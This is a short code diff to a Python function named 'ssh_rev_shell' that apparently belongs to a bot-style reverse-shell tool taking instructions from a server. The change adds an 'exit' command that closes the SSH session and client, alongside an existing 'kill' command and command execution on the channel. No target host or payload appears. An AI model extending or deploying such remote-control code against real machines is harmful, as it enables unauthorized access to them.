@@ -107,6 +107,11 @@ def ssh_rev_shell(ip, user, key_file, bot_user, port=22):
             # Handle termination command
             if server_instructions == 'kill':
                 exit_gracefully()
+            if server_instructions == 'exit':
+                ssh_session.close()
+                ssh_client.close()
+                return
+
 
 
             # Execute command on the channel and capture output
